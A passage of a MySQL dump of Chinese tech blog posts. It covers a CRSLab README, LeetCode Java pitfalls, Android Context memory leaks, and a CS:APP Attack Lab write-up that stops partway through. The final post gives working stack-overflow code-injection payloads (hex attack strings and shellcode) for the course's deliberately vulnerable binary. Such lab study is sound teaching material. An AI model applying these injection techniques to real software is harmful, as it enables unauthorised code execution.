版本（`1.4.0`，`1.5.0`，`1.6.0`，`1.7.0`）来分别替换。比如，对于 PyTorch 1.6.0 和 CUDA 10.1，输入：\r\n\r\n```bash\r\npip install torch-scatter -f https://pytorch-geometric.com/whl/torch-1.6.0+cu101.html\r\npip install torch-sparse -f https://pytorch-geometric.com/whl/torch-1.6.0+cu101.html\r\npip install torch-cluster -f https://pytorch-geometric.com/whl/torch-1.6.0+cu101.html\r\npip install torch-spline-conv -f https://pytorch-geometric.com/whl/torch-1.6.0+cu101.html\r\npip install torch-geometric\r\n```\r\n\r\n### 安装 CRSLab\r\n\r\n你可以通过 pip 来安装：\r\n\r\n```bash\r\npip install crslab\r\n```\r\n\r\n也可以通过源文件进行进行安装：\r\n\r\n```bash\r\ngit clone https://github.com/RUCAIBox/CRSLab && cd CRSLab\r\npip install -e .\r\n```\r\n\r\n## 快速上手\r\n\r\n从 GitHub 下载 CRSLab 后，可以使用提供的脚本快速运行和测试，默认使用CPU：\r\n\r\n```bash\r\npython run_crslab.py --config config/kgsf/redial.yaml\r\n```\r\n\r\n系统将依次完成数据的预处理，以及各模块的训练、验证和测试，并得到指定的模型评测结果。\r\n\r\n如果你希望保存数据预处理结果与模型训练结果，可以使用如下命令：\r\n\r\n```bash\r\npython run_crslab.py --config config/kgsf/redial.yaml --save_data --save_system\r\n```\r\n\r\n总的来说，`run_crslab.py`有如下参数可供调用：\r\n\r\n- `--config` 或 `-c`：配置文件的相对路径，以指定运行的模型与数据集。\r\n- `--gpu` or `-g`：指定gpu id，目前仅支持单GPU，默认使用CPU（-1）。\r\n- `--save_data` 或 `-sd`：保存预处理的数据。\r\n- `--restore_data` 或 `-rd`：从文件读取预处理的数据。\r\n- `--save_system` 或 `-ss`：保存训练好的 CRS 系统。\r\n- `--restore_system` 或 `-rs`：从文件载入提前训练好的系统。\r\n- `--debug` 或 `-d`：用验证集代替训练集以方便调试。\r\n- `--interact` 或 `-i`：与你的系统进行对话交互，而非进行训练。\r\n\r\n## 模型\r\n\r\n在第一个发行版中，我们实现了 4 类共 18 个模型。这里我们将对话推荐任务主要拆分成三个任务：推荐任务（生成推荐的商品），对话任务（生成对话的回复）和策略任务（规划对话推荐的策略）。其中所有的对话推荐系统都具有对话和推荐任务，他们是对话推荐系统的核心功能。而策略任务是一个辅助任务，其致力于更好的控制对话推荐系统，在不同的模型中的实现也可能不同（如TG-ReDial采用一个主题预测模型，DuRecDial中采用一个对话规划模型等）：\r\n\r\n[![img](https://i.loli.net/2021/01/11/FXjEJn4VUdMw1rK.png)](https://i.loli.net/2021/01/11/FXjEJn4VUdMw1rK.png)\r\n\r\n其中，CRS模型是指直接融合推荐模型和对话模型，以相互增强彼此的效果，故其内部往往已经包含了推荐、对话和策略模型。其他如推荐模型、对话模型、策略模型往往只关注以上任务中的某一个。\r\n\r\n我们对于这几类模型，我们还分别实现了如下的自动评测指标模块：\r\n\r\n[![img](https://i.loli.net/2021/01/11/xaY6lzRAnVJLkym.png)](https://i.loli.net/2021/01/11/xaY6lzRAnVJLkym.png)\r\n\r\n## 数据集\r\n\r\n我们收集了 6 个常用的人工标注数据集，并对它们进行了预处理（包括引入外部知识图谱），以融入统一的 CRS 任务中。如下为相关数据集的统计数据：\r\n\r\n[![img](https://i.loli.net/2021/01/11/t4Tn7YG5AwIPdD1.png)](https://i.loli.net/2021/01/11/t4Tn7YG5AwIPdD1.png)\r\n\r\n## 贡献\r\n\r\n如果您遇到错误或有任何建议，请通过 [Issue](https://github.com/RUCAIBox/CRSLab/issues) 进行反馈\r\n\r\n我们欢迎关于修复错误、添加新特性的任何贡献。\r\n\r\n如果想贡献代码，请先在 Issue 中提出问题，然后再提 PR。\r\n\r\n## 引用\r\n\r\n如果你觉得 CRSLab 对你的科研工作有帮助，请引用我们的[论文](https://arxiv.org/pdf/2101.00939.pdf)：\r\n\r\n```java\r\n@article{crslab,\r\n    title={CRSLab: An Open-Source Toolkit for Building Conversational Recommender System},\r\n    author={Kun Zhou, Xiaolei Wang, Yuanhang Zhou, Chenzhan Shang, Yuan Cheng, Wayne Xin Zhao, Yaliang Li, Ji-Rong Wen},\r\n    year={2021},\r\n    journal={arXiv preprint arXiv:2101.00939}\r\n}\r\n```\r\n\r\n## 项目团队\r\n\r\n**CRSLab** 由中国人民大学 [AI Box](http://aibox.ruc.edu.cn/) 小组开发和维护。\r\n\r\n## 免责声明\r\n\r\n**CRSLab** 基于 [MIT License](https://github.com/RUCAIBox/CRSLab/blob/main/LICENSE) 进行开发，本项目的所有数据和代码只能被用于学术目的。\r\n\r\n回复\r\n\r\n', '2022-07-05 13:18:20', 'CRSLab 是一个用于构建对话推荐系统（CRS）的开源工具包，其基于 PyTorch 实现、主要面向研究者使用', 'https://i.loli.net/2020/12/30/6TPVG4pBg2rcDf9.png', NULL, 0, NULL, NULL, 'CRSLab - 一键构建你的对话推荐系统', '2022-07-05 13:18:20', 1, 53, 5, 0, 0, NULL, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000178, NULL, NULL, '# LeetCode踩坑集锦\r\n\r\n\r\n\r\n## 写在前面\r\n\r\n寒假（假装）看完《数据结构与算法分析》之后决定是时候开始做LeetCode的题目了，在这里记录下一些LeetCode过程中遇到的坑，做LeetCode不仅是对算法的一种考验，也是对Java基础知识的一种考查，在Java基础并不是太好的现在做一定会漏洞百出，在这里统一做一个记录，也会写下对一些题目的想法。\r\n\r\n\r\n\r\n## LeetCode\r\n\r\n### Two Sum\r\n\r\n直观上的方法是遍历所有元素对找出答案，看了解答以后发现可以用Hash表实现，Hash表可以进行对另一个元素的快速查找并返回对应的位置。\r\n\r\n```\r\npublic static int[] twoSum(int[] nums, int target) {\r\n    Map<Integer, Integer> map = new HashMap<>();\r\n    for (int i = 0; i < nums.length; i++) {\r\n        map.put(nums[i], i);\r\n    }\r\n    for (Integer num : map.keySet()) {\r\n        if (map.containsKey(target - num) && !Objects.equals(map.get(num), map.get(target - num))) {\r\n            return new int[]{map.get(num), map.get(target - num)};\r\n        }\r\n\r\n    }\r\n    return null;\r\n}\r\n```\r\n\r\n上面的代码在用例[3,3] 6的时候返回结果为null，原因是第7行中第二个判断条件不成立，由于构建hash表的时候后面一个[3,1]覆盖了前面的[3,0]导致无法同时找到两个位置。（提醒了hash表一对一的性质，后面加入的元素如果key相同会覆盖前面的元素）\r\n\r\n解决办法是不遍历key而是直接遍历nums数组，比较循环的索引和hash表的value，这样可以保证找到对应的那个位置不同的元素位置。\r\n\r\n### Rotate Array\r\n\r\n```\r\npublic static void rotate(int[] nums, int k) {\r\n    for (int i = 0; i < k; i++) {\r\n        int[] temp = new int[nums.length];\r\n        temp[0] = nums[nums.length - 1];\r\n        for (int j = 0; j < nums.length-1; j++) {\r\n            temp[j + 1] = nums[j];\r\n        }\r\n        nums = temp;\r\n    }\r\n}\r\n```\r\n\r\n错误的原因是没有理解数组元素传递的本质是对数组对象引用的值传递，刚开始看到这题目觉得怎么可以用java做，java都是值传递无法改变原来数组。上面的做法的结果是把一个新的数组对象的引用赋给了nums的一个拷贝，但是原来的nums并没有引用到新的地址，所以原nums还是保持不变。\r\n\r\n查了相关资料了解到数组元素的传递与对象一样（数组也可以看成new int[]产生的对象），传递的是数组的引用的拷贝，可以通过这个引用来修改原数组的数据。', '2022-07-05 13:30:52', '寒假（假装）看完《数据结构与算法分析》之后决定是时候开始做LeetCode的题目了，在这里记录下一些LeetCode过程中遇到的坑', 'https://t9.baidu.com/it/u=633055540,2899567558&fm=85&app=131&size=f242,150&n=0&f=JPEG&fmt=auto?s=6E06E50AA570ED9250F58DCA0100E0B3&sec=1657126800&t=30e2deee88d460cf750d9c00e586f123', NULL, 0, NULL, NULL, ' LeetCode踩坑集锦', '2022-07-05 13:30:52', 0, NULL, 5, 0, 0, NULL, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000179, NULL, NULL, '## Context?\r\n\r\n`Context`在安卓开发时是一个非常常见的组件，我们会在许多地方使用它，举一些例子：\r\n\r\n- 启动新的`Activity` `Service`\r\n- 发送广播，接收广播\r\n- 填充`View`\r\n- 获取资源\r\n\r\n相信每一个开发者在看见它时都有过这样一些疑问：\r\n\r\n- `Context`是什么\r\n- `Context`的作用\r\n- `Context`从哪里来\r\n\r\n同时，我们也经历过需要一个`Context`但不知道如何去正确获取/传递的情况，事实上不正确地保存一个`Context`的引用可能会导致部分内存不能被正确GC从而造成事实上的内存泄漏。\r\n\r\n本文将着重对上面这些内容进行讲解。\r\n\r\n\r\n\r\n## Context的定义\r\n\r\n字面上解释，`Context`意为“环境”，这个解释比较符合它的作用。\r\n\r\n官方文档中对`Context`的解释是：\r\n\r\n> Interface to global information about an application environment. This is an abstract class whose implementation is provided by the Android system. It allows access to application-specific resources and classes, as well as up-calls for application-level operations such as launching activities, broadcasting and receiving intents, etc.\r\n>\r\n> 关于应用环境的全局信息的接口。它是一个抽象类，具体由安卓系统来实现。它允许我们去访问特定的应用的资源和类，同时也可以经由它去向上请求应用级别的操作例如启动`Activity`、发送广播、接收`intents`等等。\r\n\r\n我们可以把它看作是一个连接我们代码与安卓系统的“桥梁”，我们开发的应用是与运行在设备上的操作系统紧密相关的，只能通过操作系统，我们才能去启动一个新的`Activity`，向其他应用发送广播，启动一个新的`Service`或是访问我们存放在`apk`中的资源文件。\r\n\r\n`Context`就是系统为我们提供上述功能的一个接口，我们需要使用它去完成与系统的信息交换。\r\n\r\n## Context从哪里来\r\n\r\n`Context`作为一个依赖于系统的类，`SDK`中只给了我们一个抽象类，具体的实现由系统完成，下文举例使用的`ContextImpl`就是`AOSP`中安卓源码对于`Context`的一个实现。\r\n\r\n## Context的作用\r\n\r\n### Context中封装的信息\r\n\r\n我们可以看看`Context`里面包含了哪些东西（部分）。\r\n\r\n```\r\nprivate final String mBasePackageName; \r\nprivate final String mOpPackageName; //软件包名\r\nprivate final Resources mResources;\r\nprivate final ResourcesManager mResourcesManager; //用于管理资源文件\r\nprivate final Display mDisplay; //为View填充等提供屏幕尺寸、像素密度等信息\r\nprivate final DisplayAdjustments mDisplayAdjustments = new DisplayAdjustments();\r\nprivate Resources.Theme mTheme = null; //主题信息\r\nprivate File mCacheDir;\r\n@GuardedBy(\"mSync\")\r\nprivate File mCodeCacheDir;\r\n...\r\n@GuardedBy(\"mSync\")\r\nprivate File[] mExternalObbDirs;\r\n@GuardedBy(\"mSync\")\r\nprivate File[] mExternalFilesDirs;\r\n@GuardedBy(\"mSync\")\r\nprivate File[] mExternalCacheDirs;\r\n@GuardedBy(\"mSync\")\r\nprivate File[] mExternalMediaDirs; //各种文件路径\r\n```\r\n\r\n这些域的存在为功能提供了必要的信息，例如在`LayoutInflater`填充`View`时需要一个`context`作为参数，我们查看这个`context`如何被使用：\r\n\r\n```\r\nfinal XmlResourceParser childParser = context.getResources().getLayout(layout);\r\n```\r\n\r\n我们传入的`ResourceId`最终会被通过`context`的`getResource()`方法获取的`Resource`对象的`getLayout()`方法定位到对应的`xml`文件提供给`Inflater`进行解析。\r\n\r\n```\r\n// Apply a theme wrapper, if allowed and one is specified.\r\nif (!ignoreThemeAttr) {\r\n    final TypedArray ta = context.obtainStyledAttributes(attrs, ATTRS_THEME);\r\n    final int themeResId = ta.getResourceId(0, 0);\r\n    if (themeResId != 0) {\r\n        context = new ContextThemeWrapper(context, themeResId);\r\n    }\r\n    ta.recycle();\r\n}\r\n```\r\n\r\n在这里调用了`context`的`obtainStyledAttributes()`方法：\r\n\r\n```\r\npublic final TypedArray obtainStyledAttributes(\r\n        AttributeSet set, @StyleableRes int[] attrs) {\r\n    return getTheme().obtainStyledAttributes(set, attrs, 0, 0);\r\n}\r\n```\r\n\r\n最终使用了`context`中存放的主题信息为填充的`view`设置属性。\r\n\r\n现在我们知道，我们存放在`res`文件夹下的内容（布局文件、字符串文件、图片、主题……）都需要通过一个`context`去向系统获取。\r\n\r\n那么为什么在启动`activity`、启动`service`、发送广播时都需要使用`context`呢？因为这些操作与系统是紧密相关的，我们知道启动这些东西都需要使用一个叫`intent`的东西（关于`intent`的内容会在另外的文章讲），以`startActivity()`方法为例，我们一路向上追溯，可以发现启动`activity`最终是由`AcitivityManagerNative.getDefault()`的本地方法`startActivity()`执行的：\r\n\r\n```\r\ntry {\r\n    intent.migrateExtraStreamToClipData();\r\n    intent.prepareToLeaveProcess();\r\n    int result = ActivityManagerNative.getDefault().startActivity(\r\n        whoThread, who.getBasePackageName(), intent,\r\n        intent.resolveTypeIfNeeded(who.getContentResolver()), token,\r\n        target != null ? target.mEmbeddedID : null, requestCode, 0, null, options);\r\n    checkStartActivityResult(result, intent);\r\n} catch (RemoteException e) {\r\n}\r\n```\r\n\r\n这个时候我们发现，传入的`context`已经变成了上面代码中的`who`，利用这个 `context`获取了包名与方法的第四个参数`who.getContentResolver()`。它的作用是提供信息来解析`intent`的[`MIME type`](https://en.wikipedia.org/wiki/Media_type)，帮助系统决定`intent`的目标。\r\n\r\n可以看到`context`在这里同样起到了一个提供必要信息的作用。\r\n\r\n### Context的作用\r\n\r\n在这里再重复一遍上面说过的话，配合之前的例子，是不是可以更好地理解了呢？\r\n\r\n> 我们可以把它看作是一个连接我们代码与安卓系统的“桥梁”，我们开发的应用是与运行在设备上的操作系统紧密相关的，只能通过操作系统，我们才能去启动一个新的`Activity`，向其他应用发送广播，启动一个新的`Service`或是访问我们存放在`apk`中的资源文件。\r\n>\r\n> `Context`就是系统为我们提供上述功能的一个接口，我们需要使用它去完成与系统的信息交换。\r\n\r\n## Context的使用\r\n\r\n### Context分类\r\n\r\n`Context`并不是都是相同的，根据获取方式的不同，我们得到的`Context`的各类也有所不同。\r\n\r\n#### `Activity`/`Service`\r\n\r\n我们知道`Acitivity`类继承自`ContextThemeWrapper`，`ContextThemeWrapper`继承自`ContextWrapper`，最后`ContextWrapper`继承自`Context`。顾名思义，`ContextWrapper`与`ContextThemeWrapper`只是将`Context`进行了再次的包装，加入了更多的信息，同时对一些方法做了转发。\r\n\r\n所以我们在`Activity`或`Service`中需要`Context`时就可以直接使用`this`，因为它们本身就是`Context`。\r\n\r\n当系统创建一个新的`Activity`/`Service`实例时，它也会创建一个新的`ContextImpl`实例来封装所有的信息。\r\n\r\n**对于每一个`Activity`/`Service`实例，它们的基础`Context`都是独立的。**\r\n\r\n#### `Application`\r\n\r\n`Application`同样继承于`ContextWrapper`，但是`Application`本身是以单例模式运行在应用进程中的，它可以被任何`Activity`/`Service`用`getApplication()`或是被任何`Context`使用`getApplicationContext()`方法获取。\r\n\r\n**不管使用什么方法去获取`Application`，获取的总是同一个`Application`实例。**\r\n\r\n#### `BroadcastReciver`\r\n\r\n`BroadcastReciver`本身并不是一个`Context`或在内部保存了一个`Context`，但是系统会在每次调用其`onRecive()`方法时向它传递一个`Context`对象，这个`Context`对象是一个`ReceiverRestrictedContext`（接收器限定`Context`），与普通`Context`不同在它的`registerReceiver()`与`bindSerivce()`方法是被禁止使用的，这意味着我们不能在`onRecive()`方法中调用该`Context`的这两个方法。\r\n\r\n**每次调用`onReceive()`方法传递的`Context`都是全新的。**\r\n\r\n#### `ContentProvider`\r\n\r\n它本身同样不是一个`Context`，但它在创建时会被赋予一个`Context`并可以通过`getContext()`方法获取。\r\n\r\n**如果这个内容提供器运行在调用它的应用中，将会返回该应用的`Application`单例，如果它是由其他应用提供的，返回的`Context`将会是一个新创建的表示其他应用环境的`Context`。**\r\n\r\n### 使用`Context`时的陷阱\r\n\r\n现在我们知道`Context`的几种分类，其实上面的分类也就是我们获取它的方式。着重标出的内容说明了它们被提供的来源，也暗指了它们的生命周期。\r\n\r\n我们常常会在类中保存对`Context`的引用，但是我们要考虑生命周期的问题：如果被引用的这个`Context`是一个`Acitivity`，**如果存放这个引用的类的生命周期大于`Activity`的生命周期，那么`Activity`在停止使用之后还被这个类引用着，就会引致无法被GC，造成事实上的内存泄露。**\r\n\r\n举一个例子，如果使用下面的一个单例来保存`Context`的引用来加载资源：\r\n\r\n```\r\npublic class CustomManager {\r\n    private static CustomManager sInstance;\r\n \r\n    public static CustomManager getInstance(Context context) {\r\n        if (sInstance == null) {\r\n            sInstance = new CustomManager(context);\r\n        }\r\n \r\n        return sInstance;\r\n    }\r\n \r\n    private Context mContext;\r\n \r\n    private CustomManager(Context context) {\r\n        mContext = context;\r\n    }\r\n}\r\n```\r\n\r\n这段程序的问题在于不知道传入的`Context`会是什么类型的，可能在初始化的时候传入的是一个`Activity`/`Serivce`，那么几乎可以肯定的是，这个`Activity`/`Service`将不会在结束以后被垃圾回收。如果是一个`Activity`，那么这意味着与它相关联的`View`或是其他庞大的类都将留在内存中而不会被回收。\r\n\r\n为了避免这样的问题，我们可以改正这个单例：\r\n\r\n```\r\npublic class CustomManager {\r\n    private static CustomManager sInstance;\r\n \r\n    public static CustomManager getInstance(Context context) {\r\n        if (sInstance == null) {\r\n            //Always pass in the Application Context\r\n            sInstance = new CustomManager(context.getApplicationContext());\r\n        }\r\n \r\n        return sInstance;\r\n    }\r\n \r\n    private Context mContext;\r\n \r\n    private CustomManager(Context context) {\r\n        mContext = context;\r\n    }\r\n}\r\n```\r\n\r\n我们只修改了一处，第7行中我们使用`context.getApplicationContext()`这个方法来获取`Application`这个单例，而不是直接保存`context`本身，这样就可以保证不会出现某`context`因为被这个单例引用而不能回收的情况。而`Application`本身是单例这个特性保证了生命周期的一致，不会造成内存的浪费。\r\n\r\n### 为什么不总是使用`application`作为`context`\r\n\r\n既然它是一个单例，那么我们为什么不直接在任何地方都只使用它呢？\r\n\r\n这是因为各种`context`的能力有所不同：\r\n\r\n![img](https://www.viseator.com/images/context01.png)\r\n\r\n（图片出处见文末）\r\n\r\n对几个注解的地方作说明：\r\n\r\n1. 一个`application`可以启动一个`activity`，但是需要新建一个`task`，在特殊情况下可以这么做，但是这不是一个好的行为因为这会导致一个不寻常的返回栈。\r\n2. 虽然这是合法的，但是会导致填充出来的`view`使用系统默认的主题而不是我们设置的主题。\r\n3. 如果接收器是`null`的话是被允许的，通常在4.2及以上的版本中用来获取一个粘性广播的当前值。\r\n\r\n我们可以发现与`UI`有关的操作除`activity`之外都不能完成，在其他地方这些`context`能做的事情都差不多。\r\n\r\n但是我们回过头来想，这三个与`UI`相关的操作一般都不会在一个`activity`之外进行，这个特性很大程度上就是系统为我们设计成这样的，如果我们试图去用一个`Application`去显示一个`dialog`就会导致异常的抛出和应用的崩溃。\r\n\r\n对上面的第二点再进一步解释，虽然我们可以使用`application`作为`context`去填充一个`view`，但是这样填充出的`view`使用的将会是系统默认的主题，这是因为只有`acitivity`中才会存有我们定义在`manifest`中的主题信息，其他的`context`将会使用默认的主题去填充`view`。\r\n\r\n### 如何使用正确的`Context`\r\n\r\n既然我们不能将`Activity`作为`context`保存在另外一个比该`Activity`生命周期长的类中，那么如果我们需要在这个类中完成与`UI`有关的操作（比如显示一个`dialog`）该怎么办？\r\n\r\n如果真的遇到了这样的情况：我们不得不保存一个`activity`在一个比该`Activity`生命周期长的类中以进行`UI`操作，就说明我们的设计是有问题的，系统的设计决定了我们不应该去进行这样的操作。\r\n\r\n所以我们可以得出结论：\r\n\r\n我们应该在`Activity`/`Service`的生命周期范围内直接使用该`Activity`/`Service`作为`context`，在它们的范围之外的类，应该使用`Application`单例这个`context`（并且不应该出现`UI`操作）。', '2022-07-05 13:34:04', 'Context在安卓开发时是一个非常常见的组件，我们会在许多地方使用它', 'https://www.viseator.com/images/context01.png', NULL, 0, NULL, NULL, 'Android Context理解与陷阱', '2022-07-05 13:34:04', 0, NULL, 5, 0, 0, NULL, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000182, NULL, NULL, '### 简介\r\n\r\n`Attack Lab`的内容针对的是`CS-APP`中第三章中关于程序安全性描述中的栈溢出攻击。在这个`Lab`中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。本实验也是对旧版本中`IA32`编写的`Buffer Lab`的替代。\r\n\r\n我们可以从[`CMU`的`lab`主页](http://csapp.cs.cmu.edu/3e/labs.html)来获取自学者版本与实验讲义(Writeup)，讲义中包含了必要的提示、建议与被禁止的操作，从这个`lab`开始之后的`lab`对讲义中内容的依赖还是很强的。\r\n\r\n> **特别提示** 本`lab`的自学者版本需要在运行程序时加上`-q`参数来避免程序向不存在的评分服务器提交我们的答案导致报错\r\n\r\n\r\n\r\n### 前置\r\n\r\n讲义中首先给我们展示了导致程序漏洞的关键：`getbuf`函数。\r\n\r\n```\r\nunsigned getbuf()\r\n{\r\n    char buf[BUFFER_SIZE];\r\n    Gets(buf);\r\n    return 1;\r\n}\r\n```\r\n\r\n`getbuf`函数在栈中申请了一块`BUFFER_SIZE`大小的空间，然后利用这块空间首地址作为`Gets`函数的参数来从标准输入流中读取字符。由于没有对读入字符数量的检查，我们可以通过提供一个超过`BUFFER_SIZE`的字符串来向`getbuf`的栈帧之外写入数据。\r\n\r\n在代码注入攻击中就是利用函数返回时`RET`指令会将调用方在栈中存放的返回地址读入`IP`中，执行该地址指向的代码。栈溢出后，我们可以改写这个返回地址，指向我们同样存放在栈中的指令，以达到攻击的目的。\r\n\r\n### 第一部分：代码注入攻击\r\n\r\n#### Level１\r\n\r\n在这个等级中，我们不需要注入任何攻击代码，只需要更改`getbuf`函数的返回地址执行指定的函数`touch1`（该函数已经存在于程序中）。\r\n\r\n那么我们需要做的就是将栈中存放返回地址的位置改为`touch1`函数的入口地址，问题在于我们如何将地址精确地写入到原来的地址的位置。\r\n\r\n讲义给出了`getbuf`的调用函数：\r\n\r\n```\r\nvoid test()\r\n{\r\n    int val;\r\n    val = getbuf();\r\n    printf(\"No exploit. Getbuf returned 0x%x\\n\", val);\r\n}\r\n```\r\n\r\n如果攻击成功，我们不会执行到第五行，而是跳转到`touch1`中执行：\r\n\r\n```\r\nvoid touch1()\r\n{\r\n    vlevel = 1; /* Part of validation protocol */\r\n    printf(\"Touch1!: You called touch1()\\n\");\r\n    validate(1);\r\n    exit(0);\r\n}\r\n```\r\n\r\n输出上面的字符串代表我们攻击成功。\r\n\r\n下面我们利用`objdump -d`命令将程序反汇编来查看`getbuf`函数的行为。\r\n\r\n```\r\n00000000004017a8 <getbuf>:\r\n  4017a8:	48 83 ec 28          	sub    $0x28,%rsp\r\n  4017ac:	48 89 e7             	mov    %rsp,%rdi\r\n  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>\r\n  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax\r\n  4017b9:	48 83 c4 28          	add    $0x28,%rsp\r\n  4017bd:	c3                   	retq   \r\n  4017be:	90                   	nop\r\n  4017bf:	90                   	nop\r\n```\r\n\r\n代码比较简单，在第2行中将`rsp`减了0x28，申请了一块28字节的空间，第3行将`rsp`赋给`rdi`就是空间的首地址，然后调用了`Gets`函数，`rdi`就是它的参数。到这里我们可以确定`BUFFER_SIZE`的大小为0x28（自学讲义中这个值是固定的，但是真正的实验中这个值是由服务器生成的）。换句话说，在0x28字节的栈被`Gets`函数写满之后，多出来的字符会被写入`getbuf`函数的栈外。我们用图来说明栈的结构：\r\n\r\n![img](https://www.viseator.com/images/attacklab01.png)\r\n\r\n下面是低地址，上面是高地址，在`getbuf`函数申请的0x28字节内存之外的8个字节存放的就是`test`函数`call`指令后下一条指令的地址。\r\n\r\n现在我们可以知道，我们需要用0x28字节来将栈填满，再写入`touch1`函数的入口地址，在`getbuf`函数执行到`ret`指令的时候就会返回到`touch1`中执行。\r\n\r\n下面就要利用官方提供的`hex2raw`程序来帮助我们生成攻击字符串，这个程序将以空白字符隔开表示的字节转换成真正的二进制字节，注意这个程序只是原样地转换文件中的字符，所以字节序的问题是我们应该考虑的。\r\n\r\n最终的答案如下：\r\n\r\n```\r\n00 00 00 00 00 00 00 00\r\n00 00 00 00 00 00 00 00\r\n00 00 00 00 00 00 00 00\r\n00 00 00 00 00 00 00 00\r\n00 00 00 00 00 00 00 00 \r\nc0 17 40 00 00 00 00 00\r\n```\r\n\r\n可以看到前0x28个字节都使用0x00来填充，然后在溢出的8个字节中写入了`touch1`的首地址`0x4017c0`，注意字节序就可以了。\r\n\r\n#### Level 2\r\n\r\n这个等级中我们同样需要跳转到指定的函数`touch2`中，但是想要通过`touch2`需要我们进行一些操作，讲义中给出了`touch2`的代码：\r\n\r\n```\r\nvoid touch2(unsigned val) {\r\n    vlevel = 2; /* Part of validation protocol */\r\n    if (val == cookie) {\r\n        printf(\"Touch2!: You called touch2(0x%.8x)\\n\", val);\r\n        validate(2);\r\n    } else {\r\n        printf(\"Misfire: You called touch2(0x%.8x)\\n\", val);\r\n        fail(2);\r\n    }\r\n    exit(0);\r\n}\r\n```\r\n\r\n这里`cookie`是服务器给我们的一个数值，存放在`cookie.txt`文件中，自学者材料中的这个值应该都是一样的。\r\n\r\n可以看到`touch2`拥有一个参数，只有这个参数与`cookie`的值相等才可以通过这一等级。所以我们的目标就是让程序去执行我们的代码，设置这个参数的值，再调用`touch2`完成攻击。\r\n\r\n首先要注意的是`touch2`的第一个参数存放在寄存器`rdi`中，我们就是要设置这个寄存器的值为`cookie`。\r\n\r\n那么如何让程序去执行我们的代码呢？既然我们可以向栈中写入任意内容并且可以设置返回时跳转到的地址，那么我们就可以通过在栈中写入指令，再令从`getbuf`函数返回的地址为我们栈中指令的首地址，在指令中执行`ret`进行第二次返回，返回到`touch2`函数，就可以实现我们的目的。\r\n\r\n所以我决定将指令写入到栈地址的最低处，然后在溢出后将地址设置为这个栈地址。我们能完成这个攻击的前提是讲义中已经告诉我们这个具有漏洞的程序在运行时的栈地址是固定的，不会因运行多次而改变，并且这个程序允许执行栈中的代码。\r\n\r\n我们利用`gdb`在运行时查看栈地址：\r\n\r\n![img](https://www.viseator.com/images/attacklab02.png)\r\n\r\n停在`getbuf`的这里，然后查看`rsp`指向的地址：\r\n\r\n![img](https://www.viseator.com/images/attacklab03.png)\r\n\r\n可以看到首地址为`0x5561dc78`，顺便看到第6行也就是0x28个字节之后存放的原返回地址。\r\n\r\n由于我们需要在注入的代码中再次返回，就需要将二次返回的地址同样存放在栈中，这里为了避免与我们注入的代码重叠，我选择将`touch2`地址放在`getbuf`函数栈的最后8字节中。\r\n\r\n下面就要生成攻击字符串了，首先我们需要生成攻击代码。我们先将攻击代码用汇编指令的形式写出来：\r\n\r\n```\r\nmovq $0x59b997fa,%rdi # rdi = cookie\r\nmovq $0x5561dc98,%rsp # 将rsp设为存放在栈中的touch2地址的地址\r\nret # 读取rsp指向的地址并跳转\r\n```\r\n\r\n下面利用`gcc -c`命令将汇编语句编译成机器码，再`objdump -d`生成的文件就可以间接地看到最终的机器码。\r\n\r\n将指令的机器码作为我们攻击字符串的开头，`touch2`的地址放在栈中第0x20-0x28位置，将栈的首地址放在栈外的8个字节，构成我们的攻击字符串：\r\n\r\n```\r\n48 c7 c7 fa 97 b9 59 48 \r\nc7 c4 98 dc 61 55 c3 00\r\n00 00 00 00 00 00 00 00 \r\n00 00 00 00 00 00 00 00 \r\nec 17 40 00 00 00 00 00\r\n78 dc 61 55 00 00 00 00\r\n```\r\n\r\n#### Level 3\r\n\r\n该等级同样让我们跳转到`touch3`函数中，不过`touch3`函数判断有所不同：\r\n\r\n```\r\n/* Compare string to hex represention of unsigned value */\r\nint hexmatch(unsigned val, char *sval) {\r\n    char cbuf[110];\r\n    /* Make position of check string unpredictable */\r\n    char *s = cbuf + random() % 100;\r\n    sprintf(s, \"%.8x\", val);\r\n    return strncmp(sval, s, 9) == 0;\r\n}\r\n\r\nvoid touch3(char *sval) {\r\n    vlevel = 3; /* Part of validation protocol */\r\n    if (hexmatch(cookie, sval)) {\r\n        printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval);\r\n        validate(3);\r\n    } else {\r\n        printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval);\r\n        fail(3);\r\n    }\r\n    exit(0);\r\n}\r\n```\r\n\r\n仔细阅读上面的代码，我们需要传入`touch3`的参数是一个字符串的首地址，这个地址指向的字符串需要与`cookie`的字符串表示相同。这里`cookie`的字符串表示是`cookie`:`0x59b997fa`的`ASCII`表示的字符串：`35 39 62 39 39 37 66 61 00`。\r\n\r\n所以我们需要做的是将这串字符串放入栈中，并且将`rdi`的值置为字符串的首地址，再进行与上步类似的二次返回操作。\r\n\r\n这里我们需要好好考虑目标字符串在栈中的位置，下面是最终结果中的栈结构，先放出来便于讲解。\r\n\r\n![img](https://www.viseator.com/images/attacklab04.png)\r\n\r\n如果目标字符串存放的位置比`touch3`存放地址更低，在最终字符串对比的时候会发现`rdi`指向地址的内容发生了改变。分析原因，我们可以查看从`getbuf`返回到字符串比对过程中执行的指令：\r\n\r\n```\r\n00000000004018fa <touch3>:\r\n  4018fa:	53                   	push   %rbx\r\n  .\r\n  .\r\n  .\r\n  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>\r\n000000000040184c <hexmatch>:\r\n  40184c:	41 54                	push   %r12\r\n  40184e:	55                   	push   %rbp\r\n  40184f:	53                   	push   %rbx\r\n```\r\n\r\n上面列出的这部分指令都会向栈中压入新的内容，由于栈向下增长，而`rsp`一开始的位置在`touch3`地址的下一个位置，压入的新内容会覆盖`touch3`地址以下的内容，如果把目标字符串放在这部分会导致内容在比较之前就被覆盖。\r\n\r\n知道栈中应该存放的内容的结构，攻击字符串的编写就不再困难了：\r\n\r\n```\r\n48 c7 c7 90 dc 61 55 48 # mov    $0x5561dc90,%rdi mov    $0x5561dc88,%rsp ret 为寄存器赋值并返回\r\nc7 c4 88 dc 61 55 c3 00\r\nfa 18 40 00 00 00 00 00 # touch3地址\r\n35 39 62 39 39 37 66 61 # 目标字符串\r\n00 00 00 00 00 00 00 00\r\n78 dc 61 55 00 00 00 00 # 